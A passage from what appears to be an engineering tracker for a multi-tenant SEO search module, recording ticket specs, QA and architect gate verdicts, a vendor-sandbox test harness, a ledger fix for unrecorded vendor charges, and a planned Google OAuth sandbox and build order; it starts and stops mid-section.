8. **Ahrefs true-up over real HTTP:** sandbox sets `x-api-units-cost-total-actual` on responses;
   the ledger row trues down *and* up in-transaction (§6p semantics); `getBacklinkSummary`'s two
   genuinely-parallel HTTP calls sum their units correctly — the §6p ALS race transposed to real
   sockets, racing two dispatches against one provider instance.
9. **Boot guard (§A10.4):** a pure lexical predicate (private/loopback/RFC1918/link-local
   literal, `::1`, single-label host, `.local`/`.localhost`/`.internal`/`.test`/`.lan`/
   `.home.arpa` suffix, or unparseable URL ⇒ private) applied in `main.ts`'s **live branch** to
   each vendor base URL before its factory call: violation ⇒ thrown boot error naming vendor,
   host, and `SEARCH_ALLOW_PRIVATE_VENDOR_BASEURL=1` as the deliberate override. Predicate
   unit-tested including all three default vendor URLs passing; `.env.example` documents the
   override as proxy/tunnel-only. Simulate branch untouched.
10. **Fixture discipline (§A10.6):** responses come from `fixtures/**` files (per vendor/op),
    never inline literals; initial shapes copied from the landed driver unit tests; every fixture
    file carries a header marker (`UNVERIFIED-VENDOR-FIXTURE: authored from docs 2026-07-29;
    superseded by SM-41 recordings`) and one test asserts every fixture file carries it.
11. **Strictness over mocks:** unknown path → 404 and the test fails; missing required params →
    vendor-shaped error. The sandbox must be STRICTER than the injected-`fetchImpl` mocks — that
    strictness is its value over them.
12. **Zero product-code drift:** no diffs to `dispatch.ts`, `cache.ts`, `ledger.ts`,
    `registry.ts`, `simulation.ts`, `types.ts`, or any migration; no schema change; no new
    column; no mode/predicate change. Suite deterministic (two consecutive green runs), runs
    under the §0 per-file protocol, and never touches the shared dev DB.

**MUST NOT (binding, from §A10):** no compose service, Dockerfile, published port, or any
long-lived/deployable form; never runs against the shared dev database; never registered at boot;
no `SEARCH_PROVIDER_MODE` third value; no change to `simulated` semantics anywhere; no
harness-serving hooks in driver code; fixtures never asserted as vendor truth; and it must not
claim — in code comments, tracker rows, or its close-out — that OQ-9/10/11 or any SM-41 clause is
reduced. A green SM-49 is a validated client of our own vendor model, nothing more.

**Done when:** all 12 ACs demonstrably hold (QA can re-run each), the ⚡-adjacent review confirms
AC 3's provenance pin and AC 9's guard against mutation (delete the guard ⇒ a test goes red), and
the SM-41 row/§6j step-6 dependency note is applied. Status vocabulary per `docs/modules/MODULES.md`
— this section records the ruling and the ticket; nothing here is claimed beyond PLANNED.

---

## 6v · SM-48 — the tracked property can rank in simulated SERPs · **DEV-VERIFIED live**

Verified by me: search module **24 files / 439 tests green** (baseline 428, +11, zero regressions) ·
`tsc` clean · `lint:withtenants` clean (117 files).

**Fix as ruled, and the constraint was respected:** `config.search.simulation.portfolioDomains` from
`SEARCH_SIMULATION_PORTFOLIO_DOMAINS` (comma-separated, platform-level, **tenant-agnostic**) spread
into `serpFor()`'s existing candidate pool and scored by the **unmodified** shared+vendor formula —
no bespoke "always win" branch, no per-call or per-tenant injection. So `search_data_cache` stays
genuinely shared market data (D-4) and no tenant-specific value can enter it: the cross-tenant leak
the naive fix would have created is structurally absent, not merely avoided.

Read only inside the simulated provider class, which is registered only under
`providerMode === "simulate"` — so simulate-mode-only holds by construction rather than by a flag
check. Unset ⇒ empty array ⇒ the spread is a no-op ⇒ byte-identical pool to before. Documented in all
three env/compose files; `infra/compose/.env` set to `balibeach.test`.

**Mutation-probed:** adding an unconditional `"balibeach.test"` literal to the pool (bypassing the
config guard) turned the "unset is genuinely empty / pool byte-identical" test **red**; reverted and
re-verified green.

### Live proof — and I pushed it past what the agent reported

The agent rebuilt + recreated `platform` (both compose files, port 3004 still published) and re-drove
the pull on the 3 tracked keywords: two at **position 5**, one still `null`.

Two identical positions looked suspicious to me — "always position 5" would be the same
demo-uselessness in a different costume — so I marked **all 25** keywords tracked and re-pulled.
Distribution across the 25:

```
position: 1→1kw  3→1  4→2  5→5  6→2  7→4  10→2   ·   not ranking: 11
```

**14 ranking across seven distinct positions, 11 legitimately absent.** The paired 5s were
coincidence. This is the plausible, varied, reproducible spread the ticket asked for — and crucially
**"not ranking" is still a real, frequent outcome**, so the UI's honest-absence path stays exercised
rather than becoming dead code. `search_rank_snapshots` is append-only, so the earlier all-`null` rows
sit beside the new ones — which also gives SM-14's dropped/regressed comparison logic genuine history
to compare against.

**Rank tracking is now demonstrable end to end in the only mode dev runs in.**

*Follow-up, minor:* the agent noted it did not check whether containers other than `platform` needed
recreating to see the new env var. Only `platform` reads it, so nothing else is affected — recorded so
nobody re-investigates.

---

## 6w · SM-49 — vendor sandbox harness · **DEV-VERIFIED**, and it surfaced SM-50

Verified by me: full repo **100 files / 1128 tests green in ONE `npx vitest run --maxWorkers=4`** ·
`tsc` clean · `lint:withtenants` clean (136 files).

`src/testing/vendor-sandbox/` — `node:http` server on `127.0.0.1:0`, a fresh instance per test file,
per-instance closures with no module-level singletons (mirroring the ALS discipline it exists to
exercise). 17 fixture builder files, each carrying the literal
`UNVERIFIED-VENDOR-FIXTURE: authored from docs 2026-07-29; superseded by SM-41 recordings` marker, with
`fixtures.test.ts` asserting the marker is present on every one. Placed **outside** `modules/search/`
so §6e's exact-set-equality egress pin stays byte-identical — confirmed still green and unchanged.

**Proven over real sockets, which an injected `fetchImpl` structurally cannot do:** all three real
zero-arg factories registering and dispatching; **rehearsal fidelity asserted** (`providerMode` is
`live`, driver carries no simulated marker, persisted row stamps `simulated = false`); the DFS
Standard-queue state machine with a genuine **≥2× 40602 poll** before `20000` plus the never-ready
give-up path and the `live` queue variant; per-vendor auth strictness (Basic / `key=` / Bearer) with a
positive and negative case each; vendor errors returned **inside a 200** for all three shapes;
**Ahrefs true-up under real concurrent HTTP** — a genuine two-engagement race, each round trip truing
up to its own total (deliberately cross-engagement, since the per-engagement advisory lock would
serialize same-engagement dispatches); and cache hits asserted against the sandbox's own **request
counter** (zero new requests), not merely `cost == 0`.

**Boot guard (the §A10 R3 hazard, which predates the sandbox):** `search-vendor-baseurl-guard.ts`, a
pure lexical predicate over loopback/RFC1918/link-local IPv4+IPv6 literals, `.local/.localhost/
.internal/.test/.lan/.home.arpa` suffixes, single-label hosts and unparseable URLs, wired into
`main.ts`'s live branch **before any vendor factory call**. Override read from `process.env` rather
than `config.ts` (SM-48 owned that file this wave; TODO left to consolidate). Documented as an
**accident guard, not authz** — it is lexical and trivially bypassable by anyone who wants to.
Pinned two ways: unit tests on the predicate plus a **static text pin proving `main.ts` actually calls
it before the DataForSEO factory**. That pin earned its place immediately — it caught two real bugs
during development (CRLF line endings and IPv6-bracket retention on this Node build).

**Zero product-code drift:** only `main.ts` edited. Every driver and the dispatch/cache/ledger/registry
surface was read-only. AC 12 held.

### ⚠️ SM-50 · **NEW, money-path** — a failure after a BILLABLE side effect leaves no ledger row

The agent hit this while writing AC 5/7 and did the right thing: it pinned the **actual** behaviour
(`rows).toHaveLength(0)`) instead of assuming the `failed` row the AC wording implied, then flagged
the discrepancy rather than editing a driver to make its expectation true.

**Verified by me, and it is worse than a wording discrepancy.** A provider exception fires *inside*
`runInCacheCriticalSection`'s transaction, before `insertLedgerRow` — so the whole transaction rolls
back and **no row survives at all**. That was a deliberate, tested SM-04 decision (§4: "a provider
failure rolls back the whole critical section — no billed row, no poisoned cache") and it is **correct
for a failure BEFORE the vendor was engaged** (auth rejected, connection refused, scope/budget
refusal — the last of which already writes separately via `recordBlocked`).

It is **wrong for a failure AFTER a billable side effect**, and DataForSEO's Standard queue is exactly
that shape: `dataforseo.ts`'s own header records that `task_post` **enqueues and is charged at that
point** (~$0.0006). So: post the task → the vendor charges → polling exhausts → `fetchSerpResults`
throws → rollback → **money spent at the vendor, nothing in our ledger.** Because the stop-loss sums
the ledger, a run of poll failures burns real deposit that **no budget tier can see** — a fail-open
reached through transactional atomicity rather than through a guard, which is why five gates of guard
review never found it.

**No live exposure today**, and this is the reason it is a ticket rather than an emergency: simulate
mode charges nothing and DataForSEO is unfunded (OQ-11 open). **It must close before OQ-11 is funded** —
that is the trigger, not a date.

**Fix direction (needs an architect ruling, do not improvise):** distinguish *failed-before-side-effect*
from *failed-after-side-effect*, and for the latter record a row at the incurred cost **outside** the
rolled-back transaction — the pattern `recordBlocked` already establishes. Open questions for the
architect: whether that is a `failed` row or a distinct status (a `failed` row that nonetheless carries
real cost is a new semantic for anything summing the ledger); whether the driver must declare which
methods have billable side effects (probably yes — only the driver knows its vendor's billing point);
and whether true-up can later reconcile an orphaned charge. Tier `senior-be`, ⚡.

**→ RULED 2026-07-30: §6x.2 (tracker) + addendum §A11 (binding). Ticket spec in §6x.**

---

## 6x · Architect session 2026-07-30 — owed ⚡ gate half (SM-40/42/18), SM-50 ruling, SM-51 spec, revised dev-completion order

*(Section letter: §6a–§6w are taken; **§6x** is the next free letter and this section claims it.
Owner directive driving it: credentials gate **acceptance**, not **construction** — finish all dev
work achievable without real API keys/OAuth; staging is where real-vendor/real-human acceptance runs.
Binding rulings live in addendum **§A11** (incurred-cost ledger) and **§A12** (Google surfaces);
this section is the tracker-side record, gate verdicts, ticket specs, and the build order.)*

### 6x.1 · The owed architect gate half — SM-40 + SM-42 + SM-18 · **APPROVE × 3**

QA's half passed all three in §6r; the architect half never ran (its agent died mid-stream). Run
now against the code as landed, not on reports: `dispatch.ts` / `ledger.ts` / `types.ts` /
`ahrefs.ts` / `config.ts` / `sem-plan.ts` / SEM controller surface / `qa-adversarial-sm40-42-18.test.ts`
/ `config-money-env.test.ts` all read in full or at the load-bearing lines.

**SM-40 · per-provider ceiling — APPROVE.**
- Cascade order (engagement → tenant → provider → global, first breach wins) correct; **unset cap ⇒
  the aggregate is never attempted** — stronger than a null-skip in arithmetic, verified at
  `dispatch.ts:297-320`. Fail-closed `ProviderCeilingUnavailableError` with the guarded
  `recordBlocked` secondary-failure pattern — the §4d template followed exactly.
- `PROVIDER_MTD_QUERY_SQL` = the global template + one parameterized `AND provider = $2`; TTL cache
  keyed `provider::mode` (both axes). Seven mutation probes recorded in §6n, each precisely scoped.
- **Lint-withtenants allowlist entry for `sumProviderMonthToDate` (`argPattern: "companyIds"`):
  RATIFIED** — the ratification §A6 said to grant at this gate. Conditions carried forward from the
  `sumGlobalMonthToDate` ratification (§4d/§6c): companies-table array only, ONE scalar aggregate,
  read-only, single statement, `provider`/`simulated` referenced in WHERE only, shape enforced by
  the anchored `ledger.test.ts` assertion (not the name-capture regex §6d killed). The deliberately
  distinct argument name — so SM-43's content keying cannot absorb it into the global entry — is
  the scheme working as designed. Widening the projection or adding a JOIN voids this ratification.

**SM-42 · true-up seam — APPROVE.**
- `takeActualCostUsd?()` optional-with-meaning (absence = "no correction available", never $0);
  ALS-scoped capture is isolation **by construction**; both racing tests are genuine races; the
  in-transaction `trueUpLedgerOnConnection` keeps `posted` unobservable when an actual is reported;
  budget arithmetic never re-runs — pinned by the estimate-clears/actual-would-breach test (§6p).
- The §6p nuance is **CONFIRMED as binding**: even after SM-41, "actual" is row-scoped — Ahrefs
  rows only; Semrush (no confirmed signal) and DataForSEO (flat price) stay
  "cost to serve (standard rates)" permanently. A page-level wording flip is refused in advance.
- Noted for SM-50 (not a defect): `withActualCostCapture` discards the store when `fn` throws.
  That is exactly the seam §A11 extends — the incurred-cost channel rides the same store.

**SM-18 · SEM domain — APPROVE.**
- `sem-plan.ts` read in full: pure, deterministic (stable input order preserved, cross-group sort,
  alphabetical majority-intent tie-break), provenance three-state (providers enumerated distinct +
  sorted, simulated/real counted separately, unpulled never coerced) — §A2 honoured at the pure
  layer with the controller MUST stated in the header.
- Controller surface verified at the greps QA's 25-routes/25-`authorize()`/27-`assertUuid` audit
  already covered: all four status whitelists are exact-match `Set.has()` on create AND patch;
  `applied` is refused everywhere with the owning ticket named (SM-30/21); the transitions map's
  `applied: []` forecloses it as a from-state. Cerbos riding the landed `resource_search_campaign`
  policy at baseline tier for ERP-side draft states is consistent with the §4g precedent (elevated
  actions gate live external mutations; none exist in this ticket).
- Two deliberate deviations accepted: empty fallback on negatives (a fabricated negative would
  silently exclude real traffic — empty is the honest failure) and snake_case timestamps in SEM
  SELECTs (typed as-they-arrive, §6t item 1). Minor debt: `search.controller.ts:579`'s half-stale
  "until SM-42" comment — swept into SM-23's reconcile.

**The §6r fix I made myself (`config.ts` `moneyEnv()` throwing at boot) — reviewed independently
here as owed: APPROVE, with one real coverage gap found → SM-52.**
- The mechanism is right and the reasoning survives adversarial re-derivation: an inert NaN tier and
  a skipped null tier enforce identically nothing, so the parse site is the only place "unset" and
  "unreadable" still differ. Throw-on-set-but-uninterpretable, whitespace-as-unset, `0`/negative
  refused (an explicit $0 cap is ambiguous between "no ceiling" and "refuse everything" — pillar
  kill switches and scope toggles are the stop-everything tools, so the ambiguity is refused at
  boot). Pin file `config-money-env.test.ts` verified: 9 cases, module-registry reset per case
  (mutating env after one import would prove nothing), 6/9 red with the guard deleted.
- **The gap: the remedy was applied to ONE variable.** `SEARCH_GLOBAL_MONTHLY_CAP_USD` (the
  **default deployment's only platform-wide ceiling**, the §4d scenario verbatim) and
  `SEARCH_TENANT_MONTHLY_CAP_USD` still parse via raw `Number()` — a typo'd global cap is NaN,
  `evaluateBudget` skips the tier via the `!Number.isFinite` line, and the platform runs with no
  global ceiling while looking configured. Same class: `SEARCH_BUDGET_WARN_RATIO`,
  `reservationFraction()` (silently keeps 0.5 on a malformed operator value), and the four
  plan-price/allowance vars (`Number(env ?? 0)` — NaN fails closed via non-registration, but the
  boot log then says "no rate" to an operator who *set* one). None of this blocks SM-40 — the
  parses predate it — but it is the §6r lesson un-generalized. **→ SM-52** (spec below).
  Corollary: `evaluateBudget`'s `!Number.isFinite` line keeps its "clarity, not enforcement"
  comment — still true — but until SM-52 lands it is coincidentally the only thing standing behind
  two tiers; SM-52 removes that coincidence.

**Verdict consequence:** SM-40, SM-42, SM-18 have both gate halves discharged → **LANDED**
(ledger rows updated).

**Two further owed reviews discharged in this session (cheaper here than as mobilizations):**
- **SM-46 async architect look (owed by §6j):** both WHERE predicates verified at the code —
  `modules/search/index.ts:50` (`WHERE simulated = $1` inside the DISTINCT-ON subquery, param from
  `providerMode`) and the identical predicate in `draftReportNarrative`; §6m's both-directions
  mixed-table evidence accepted. **Discharged.** SM-14's ⚡ gate still re-verifies against
  genuinely-written rows (unchanged).
- **SM-49 ⚡-adjacent review, architect half (owed by §6u):** AC 3's provenance pin confirmed in
  all three sandbox suites — asserted on the dispatch RESULT and on the PERSISTED row
  (`dataforseo.sandbox.test.ts:118-140` and siblings); AC 9's boot guard confirmed wired in
  `main.ts:39,148` before any factory call, with the predicate unit tests + the static text pin.
  **Architect half discharged.** Remaining for the QA batch: the AC 9 delete-the-guard mutation
  probe and the fixture-marker sweep re-run. The §6w TODO (override read from `process.env` rather
  than `config.ts`) folds into SM-52.

### 6x.2 · SM-50 ruling — incurred-cost ledger rows (binding text: addendum §A11)

Decisions, one line each; §A11 carries the full reasoning and the consumer enumeration:

1. **Locus:** written OUTSIDE the rolled-back transaction via a new `recordIncurred()` —
  `recordBlocked`'s fresh-short-transaction pattern, with the §4d secondary-failure guard (a failing
  audit write must never replace the provider error). Write-ahead intent rows REJECTED for v1
  (they would dismantle SM-04's single-transaction atomicity for a residual crash window bounded to
  cents, which SM-41's monthly reconciliation is designed to catch); revisit trigger recorded in §A11.
2. **Status:** a NEW ledger status **`incurred`** (0034 CHECK widened additively). `failed` keeps
  its cost-0 invariant. The three stop-loss sums and the `provider_cost.month` rollup are
  **status-blind by construction (verified in the SQL)** — incurred cost binds every budget tier and
  the exec rollup with zero changes to them; the ACs pin that property.
3. **Driver declaration:** dynamic, not static — a billing point is an *event with an amount*, so
  the driver calls **`recordIncurredCostUsd(usd, vendorRef?)`** at the moment the vendor confirmably
  charges (DFS `task_post` accepted-tasks × published rate; prepaid vendors per served response);
  `recordActualCostUsd` (SM-42) implies incurred — one ALS store, two channels, composed not
  duplicated. `withActualCostCapture` catches `fn`'s throw and rethrows wrapped
  (`ProviderFailedAfterSpendError { cause, incurredUsd, vendorRefs }`) only when incurred > 0;
  otherwise today's behaviour byte-for-byte (rollback, no row — still correct before the vendor
  was engaged).
4. **Reconciliation:** new nullable `vendor_ref` column, stamped on incurred AND successful rows
  where the driver has one (DFS task id). The SM-14 callback path must never re-post a paid task
  and, on a late completion of a written-off task, may advance `incurred → completed` (same cost)
  while persisting through the normal writers — never a second cost-bearing row. Generic
  `trueUpLedger` stays `posted`-only.
5. **Attribution honesty:** incurred cost is standard-rate accounting exactly like every other
  ledger figure (§A3) — no new "basis" column, and the SM-17 "actual" prohibition already prevents
  the overclaim. Ambiguous timeouts (charge unknowable) deliberately under-record; SM-41's ≥20%
  tripwire + console reconciliation are the designed catch. Simulators never record incurred.

**SM-50 ticket (spec):** tier `senior-be` · **opus·medium** (transaction-boundary + failure-path
reasoning on the money core; a mistake is a silent fail-open and a cheap-seat re-run would cost more
than the flag) · **⚡** (new status value, driver-interface extension, migration). Deps: none open
(SM-42 LANDED). **Binding trigger: MUST be LANDED before OQ-11 funds DataForSEO** — and before SM-41.
Owns: `providers/{types,dispatch,ledger,dataforseo,semrush,ahrefs}.ts`, one additive migration
(status CHECK widening + `vendor_ref text NULL`, senior-db eyes at the gate), `notifications.ts`
(+`search.provider.incurred_cost` → bell), one SM-17 legend line + its test.
**AC (done when):**
1. DFS Standard poll-exhaustion e2e (sandbox, per-file DB): dispatch throws, cache row absent,
  **exactly one `incurred` row** at accepted-tasks × published rate carrying `vendor_ref`,
  `simulated` stamped from the dispatch value.
2. Failure BEFORE any billable point (auth rejected, connect refused): byte-for-byte today —
  rollback, no row (pinned as the negative control).
3. The §4d headline: a loop of N incurred failures accrues N × rate into MTD and the N+1-th
  dispatch **refuses on a budget tier** — deposit burn is now visible to the stop-loss (mutation
  probe: status-filtering any MTD sum turns this red).
4. Mixed `task_post` accept/reject fixture: only accepted tasks are recorded (rejected tasks are
  not charged).
5. `recordIncurred` secondary failure: provider error still propagates, span event records the
  audit failure (the guarded-recordBlocked template).
6. §6w's sandbox pin (`rows).toHaveLength(0)`) flipped to assert the incurred row — the discrepancy
  that surfaced this ticket becomes its acceptance evidence.
7. Event lands in the bell with an href; SM-17 renders `incurred` verbatim with the one-line legend;
  the callback-path interlock (no re-post, no second cost-bearing row) pinned.
8. Mutation probes per the §6r standard — delete the driver recording call, the wrapper catch, or
  make `recordIncurred` lossy ⇒ red. Full suite green; `lint:withtenants` clean (no new
  cross-tenant calls).

### 6x.3 · SM-51 ruling + spec — Google surfaces dev-buildable without a Google OAuth client (binding text: addendum §A12)

Rulings (full reasoning §A12):

1. **Sandbox extension, §A10 rulings reused not re-derived:** the vendor sandbox gains a **google
  fixture family** — OAuth token endpoint as a *stateful* machine (issue/refresh/rotate/revoke,
  the DFS-task-state precedent), GSC Search Analytics + sites, GA4 `runReport`, Ads read + mutate
  envelopes. Test-harness fixture only (A10.2 verbatim: no compose form, per-file test DBs only);
  provenance is **audience, not label** — rows minted only where §A10's invariant already allows;
  every fixture carries `UNVERIFIED-VENDOR-FIXTURE` superseded by SM-41G recordings; strictness
  over mocks; the §A10.4 boot guard extends to the Google base-URL/issuer seams in live mode.
2. **Egress class ruling (amends nothing, scopes §A5):** GSC/GA4/Ads data is **client-private,
  $0-billed, per-client-OAuth** — a THIRD egress class, not shared market data. It does NOT ride
  `SearchDataProvider`/`dispatchProviderOp`, does NOT touch `search_data_cache` (no-RLS — a
  client's own Search Console rows in a cross-tenant cache would be a leak by design), and writes
  only tenant-scoped RLS'd tables. §6e's egress-inventory set is amended **deliberately** with
  exactly the new `modules/search/google/*` client files. Google Ads WRITES remain governed by
  SM-21's approve-execute-replay + WS4 regardless of transport. New tables carry
  `simulated boolean NOT NULL DEFAULT false` from day one (the §A8.2 external-import precedent +
  SM-37's retroactive seed rule — demo rows must be stampable or must not exist).
3. **OAuth against the local issuer: YES for the machine path.** The stack already runs Keycloak
  (P5b) and the vault path is LANDED (0033 secret-box + `setConnectionTokens`, 0035 already widened
  `provider`/`owner_kind` for exactly these providers). A `google-dev` realm client exercises the
  full authorization-code round trip (state + PKCE + redirect validation), token exchange, refresh
  incl. rotation, RFC-7009 revocation, expiry handling, and encrypted vault storage — the entire
  token-custody surface SM-25's opus flag exists for. **What it structurally cannot exercise
  (staging clauses, SM-41G):** Google's consent screen + incremental-consent + scope-grant
  semantics; refresh-token longevity under the OAuth app's publish status (Testing-mode tokens
  expire in 7 days — a production-behaviour fact no local issuer can rehearse); Google-side
  revocation; quota/429; Ads developer-token approval + MCC/login-customer-id semantics; and
  whether real Google accepts our serialized requests at all. Honesty rule: a connections surface
  renders the issuer host whenever it is not Google's — a dev-issuer connection must be readable
  as one at a glance.
4. **The §A10 sentence, transposed and binding:** *a green Google sandbox/Keycloak harness is a
  validated client of our own model of Google, not a validated Google integration.* SM-41G exists
  so nobody mistakes the first for the second.
5. **SM-25 IS decomposed** — read-only ingestion and live-ads writes are different risk classes:
  - **SM-25a · OAuth core** (senior-be · **opus·medium**, ⚡): authorize-URL + callback
    (state/PKCE/redirect forgery refused — publish the attack list, the §4g standard), token
    exchange/refresh/revoke against the config'd endpoints, vault storage (`hasToken` reads only),
    `owner_kind='client'` links, property bindings (`gsc_connection_id`/`ga4_connection_id`
    resolve), Connections-tab wiring (SM-11's deferred addition), issuer-host honesty line.
    Dev acceptance = Keycloak round trip driven in a browser + sandbox token fixtures in per-file
    tests. Deps: SM-51.
  - **SM-25b · GSC + GA4 read ingestion** (medior · default): `google/{gsc,ga4}-client.ts`,
    additive migration for the perf tables (+`simulated`, senior-db eyes), scope-driven ingestion
    (flows own zero routes — §A9.8), Search-Performance surface, GSC keyword import
    (`source='gsc'` exists in 0034). Deps: SM-25a. Read-only, $0 — deliberately NOT opus.
  - **SM-25c · Ads read binding** (senior-be · default): ads client + account link + read pulls
    into the SM-20 tables (same idempotent UNIQUE-day upserts). Deps: SM-25a; after SM-20.
  - **SM-26 · executor** — scope unchanged; its CODE builds against SM-51's mutate fixtures once
    SM-21 + SM-25c land; its real-push AC is staging (test account), recorded as such.
6. **SM-41G · NEW sibling of SM-41** (qa · GATED on: Google Cloud OAuth client + one real GSC/GA4
  property + Ads test account): per-surface staging checklist — real consent flow, refresh after
  real expiry, Google-side revoke detected, one real GSC query / GA4 runReport / Ads read
  reconciled against Google's own UIs, quota headroom noted, fixture backport in the same PR as
  any driver fix (A10.7 transposed). SM-26's real push rides the same gate.

**SM-51 ticket (spec):** tier `senior-be` · default (protocols encoded from docs; hazardous
decisions settled here, not delegated). Deps: none (SM-49 LANDED). Owns:
`src/testing/vendor-sandbox/**` (google family + token state machine), google fixture files
(marked), `config.ts` google endpoint/credential seams, `main.ts` guard extension,
`infra/keycloak` realm-client provisioning + runbook lines, `.env.example`s. **Nothing in
`modules/search/` beyond config seams** — the clients are SM-25a/b/c's.
**AC:** sandbox serves every google family with vendor-shaped auth strictness (Bearer + OAuth
client auth) and 404-on-unknown-path; the token machine issues/refreshes/rotates/revokes with
state a bare-fetch test drives end-to-end; every fixture carries the UNVERIFIED marker + sweep
test; boot guard covers the google seams in live mode (delete ⇒ red, the SM-49 pin pattern);
Keycloak `google-dev` client provisions idempotently with a runbook line; zero product-code drift
outside the named seams; §6e's egress pin untouched (no new egress exists until SM-25a).

### 6x.4 · Revised dev-completion order — everything achievable without keys

Each step = one `/army` mobilization; 1–2 agent cap; `∥` = blessed pairs (disjoint files stated).
`search.controller.ts` remains the bottleneck: it is edited in steps 3, 5(SM-16), 6(SM-20), 8, 9 —
**never two of those concurrently.**

| Step | Work | Seat · model | File ownership / why the pairing is safe |
|---|---|---|---|
| 1 | **SM-50** ⚡ ∥ **SM-52** | senior-be · **opus·medium** ∥ junior · default | SM-50: `providers/*` + migration + `notifications.ts` + one SM-17 legend line. SM-52: `config.ts` + `config-money-env.test.ts` ONLY. Disjoint. Gate: QA + architect on SM-50; inline QA on SM-52 |
| 2 | **Owed-gates QA batch** — *(amended 2026-07-30: SM-08/10/13 cleared at §6y while this section was being written; §6y's closing "gate debt" line predates §6x.1's discharges of the SM-40/42/18 architect half, the SM-46 look, and the SM-49 architect half)* — **SM-17 · SM-47 · SM-48** QA passes + **SM-49 QA half** (AC 9 delete-the-guard mutation probe + fixture-marker sweep) | qa · default, SOLO | Test-only edits; runs after step 1 so it gates a stable money core. With §6x.1 + §6y, this batch closes ALL remaining gate debt except SM-14's (which travels with its remainder, step 3) |
| 3 | **SM-14 remainder** ⚡ | senior-be · default, SOLO | Controller-heavy: DB-backed integration tests, stamp mutation probes (`DispatchResult.simulated` substitution ⇒ red), `listKeywords` SELECT widening + BFF types/fixtures (§4i), callback-path interlock with SM-50's incurred rows. Gate re-verifies SM-46a/b against real rows |
| 4 | **SM-15** ∥ **SM-16** | senior-integrator ∥ medior · default | n8n JSON/seeds/runbook, ZERO platform routes (§A9.8) ∥ controller + snapshot writers — disjoint (§6j blessing carried) |
| 5 | **SM-51** ∥ **SM-30** | senior-be ∥ senior-be · default | `testing/vendor-sandbox/**` + config seams + keycloak script ∥ controller exports/mark-applied + files artifacts — disjoint |
| 6 | **SM-19** ∥ **SM-20** | senior-fe ∥ senior-integrator · default | platform-ui only ∥ one controller webhook route + n8n — disjoint |
| 7 | **SM-21** ⚡ | senior-be · **opus·high**, SOLO | approve-execute-replay across hub gate + module + UI; a bypass is unacceptable. Gate: QA + architect, no-bypass proof |
| 8 | **SM-25a** ⚡ | senior-be · **opus·medium**, SOLO | token custody + callback-forgery edge cases; controller connections routes + `google/oauth` + UI Connections tab. Deps SM-51 |
| 9 | **SM-25b** → **SM-25c** | medior → senior-be · default | Both controller-touching — sequenced, never paired |
| 10 | **SM-26 (code)** ∥ **SM-22** | senior-integrator ∥ medior · default | executor vs SM-51 mutate fixtures (real push = staging) ∥ reports pipeline — disjoint |
| 11 | **SM-23** → **SM-24** | junior → medior · default | docs/runbook reconcile (incl. §A4.4 n8n line, `controller:579` stale comment) → full e2e + Playwright; MODULES.md moves toward `DEV-VERIFIED` **scoped to the keyless surface** |

**What genuinely cannot leave dev — this is what staging is for, verbatim:**
- **SM-41** (per vendor, gated OQ-9/10/11): real envelope truth, error-code inventory, the true-up
  header as actually sent, per-field billing units, 429/quota behaviour, ledger-vs-vendor-console
  reconciliation, the ≥20% estimate tripwire, fixture backport. **SM-50 must be LANDED before
  OQ-11 funds the deposit.**
- **SM-41G** (Google, gated on the OAuth client + properties + test account): consent screen +
  scope semantics, refresh-token longevity under publish status, Google-side revocation, quota,
  Ads developer token/MCC, real GSC/GA4 data truth, SM-26's real push.
- **Money truth:** §A3's blended per-client figure recompute after the first staging month;
  "actual" wording (row-scoped, Ahrefs-only) unlockable only after SM-41.
- Everything else — every gate, every fail-closed proof, all UI, all flows, both sandboxes —
  is dev-completable. A green dev estate means staging failures triage to *wrong vendor facts*,
  not broken plumbing (§A10.5, now covering Google too).

### New tickets opened by this session

| # | Scope | Tier · model | Deps / order |
|---|---|---|---|
| **SM-50** | Incurred-cost ledger rows (§6x.2, §A11) | senior-be · **opus·medium** ⚡ | none; before OQ-11 funding + SM-41 |
| **SM-51** | Google vendor-sandbox family + OAuth-local harness (§6x.3, §A12) | senior-be · default | SM-49 (landed); before SM-25a |
| **SM-52** | Generalize §6r's parse-site guard: `SEARCH_GLOBAL_MONTHLY_CAP_USD` (throw-on-malformed, default-on-unset — the global tier must never be typo-skippable), `SEARCH_TENANT_MONTHLY_CAP_USD`, `SEARCH_BUDGET_WARN_RATIO` (bounded (0,1]), `reservationFraction` (throw on set-but-uninterpretable or ∉(0,1]), the four plan-price/allowance vars; fold `SEARCH_ALLOW_PRIVATE_VENDOR_BASEURL` into `config.ts` (§6w TODO). Extend `config-money-env.test.ts` per var with mutation probes | junior · default | none; blessed ∥ SM-50 (config.ts only) |
| **SM-25a/b/c** | SM-25 decomposition (§6x.3 item 5) | 25a senior-be · **opus·medium** ⚡ · 25b medior · 25c senior-be | 25a after SM-51; 25b/25c after 25a |
| **SM-41G** | Google staging acceptance (§6x.3 item 6) | qa · default | GATED: OAuth client + properties + test account |

---

## 6y · ⚡ QA gate — SM-08 + SM-10 + SM-13 · **ALL PASS** (the oldest gate debt, cleared)

These three carried discharged ACs from 2026-07-29 with **no gate at all**, and two had been reported
by agents that died before writing a final report — so their ledger entries were my verification, not
the implementers'. A full day of other tickets had been built on top of them.

Verified by me: the six relevant files **45 tests green** (up from 25 — the +20 are the gate's own
adversarial additions) · `tsc` clean. **SM-08/SM-10/SM-13 → LANDED.**

### SM-08 — the concurrency claim is now actually proven

The ticket claimed idempotency is enforced **in the schema**, but **every existing test posted
sequentially**, which only exercises the app-layer re-check — not the race the UNIQUE constraint exists
to close. QA added a genuine `Promise.all` race: exactly one response reports `idempotent:false`, the
other `true`, same id, one audit row, one finding row. Postgres blocks the second
`INSERT … ON CONFLICT` on the row lock and resolves it to a no-op once the first commits. **The claim
was true; the evidence for it did not exist until now.** That distinction is the whole point of a gate.

Also held: seven hostile/oversized/partial reports all 400 with **zero** rows left behind — traced
structurally, since `validateCrawlerReport` throws *before* `authorize()`/`withTenants` is entered and
the whole insert+diff+events sequence sits in one transaction; the hash cannot be influenced beyond
legitimate content (key order and whitespace collapse by canonicalization); the 3-run
open→fixed→reappear-as-`regressed` sequence works and a caller-supplied `regressed` is still refused.

### SM-10 — clean, and it corrected an attack I specified wrongly

Verified structurally rather than from the comment: exactly **one** gateway call per request regardless
of finding/keyword count, and the read-txn → network → write-txn separation genuinely holds, so
**SM-32's connection-held-across-network-IO hazard is not reintroduced**. Gateway fail-closed when
unconfigured; `egress-inventory.test.ts` confirmed to actually cover these files.

**My brief was wrong on one attack** and it said so instead of manufacturing a gap: I asked whether an
over-bound request 400s or silently truncates, but `MAX_BRIEF_FINDINGS`/`MAX_TRIAGE_FINDINGS`/
